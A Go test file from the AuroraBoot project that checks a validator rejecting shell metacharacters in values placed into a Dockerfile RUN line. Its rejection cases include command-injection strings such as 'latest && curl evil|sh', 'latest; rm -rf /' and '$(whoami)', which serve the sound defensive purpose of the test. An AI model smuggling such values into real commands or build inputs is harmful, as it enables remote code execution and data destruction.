package auroraboot

import (
	"strings"
	"testing"

	"github.com/kairos-io/AuroraBoot/pkg/builder"
)

// TestValidateKairosInitValue exercises the allowlist that guards every
// admin-supplied value reaching the kairos-init Dockerfile RUN line. Real
// Kairos/k8s/model strings must pass; anything with a shell metacharacter must
// be rejected so it cannot break out of the RUN command.
func TestValidateKairosInitValue(t *testing.T) {
	t.Parallel()

	valid := []string{
		"latest",
		"v3.2.1",
		"3.2.1",
		"24.04",
		"v1.30.0+k3s1",
		"v1.29.4+k0s.0",
		"generic",
		"rpi4",
		"nvidia-jetson-agx-orin",
		"ubuntu:24.04",
		"quay.io/kairos/kairos-init:v0.5.0",
		"my_model-1.2",
	}
	for _, v := range valid {
		if err := validateKairosInitValue("field", v); err != nil {
			t.Errorf("expected %q to be accepted, got error: %v", v, err)
		}
	}

	invalid := []string{
		"latest && curl evil|sh",
		"latest; rm -rf /",
		"$(whoami)",
		"`id`",
		"v1.0 && reboot",
		"a|b",
		"a&b",
		"a>b",
		"a<b",
		"a(b)",
		"a'b",
		"a\"b",
		"a b",
		"a\nb",
		"a\tb",
	}
	for _, v := range invalid {
		if err := validateKairosInitValue("field", v); err == nil {
			t.Errorf("expected %q to be rejected, but it was accepted", v)
		}
	}
}

// TestValidateKairosInitOptions confirms optional fields are only validated
// when set, and that a tainted value in any interpolated field is rejected.
func TestValidateKairosInitOptions(t *testing.T) {
	t.Parallel()

	// All empty: nothing to validate.
	if err := validateKairosInitOptions(builder.BuildOptions{}); err != nil {
		t.Errorf("empty options should pass, got: %v", err)
	}

	// Realistic values pass.
	ok := builder.BuildOptions{
		Model:             "generic",
		KairosVersion:     "v3.2.1",
		KubernetesDistro:  "k3s",
		KubernetesVersion: "v1.30.0+k3s1",
	}
	if err := validateKairosInitOptions(ok); err != nil {
		t.Errorf("realistic options should pass, got: %v", err)
	}

	cases := map[string]builder.BuildOptions{
		"model":              {Model: "generic; rm -rf /"},
		"kairos version":     {KairosVersion: "latest && curl evil|sh"},
		"kubernetes distro":  {KubernetesDistro: "k3s; reboot"},
		"kubernetes version": {KubernetesVersion: "v1.30$(reboot)"},
	}
	for field, opts := range cases {
		err := validateKairosInitOptions(opts)
		if err == nil {
			t.Errorf("expected tainted %s to be rejected", field)
			continue
		}
		if !strings.Contains(err.Error(), field) {
			t.Errorf("error for %s should name the field, got: %v", field, err)
		}
	}
}
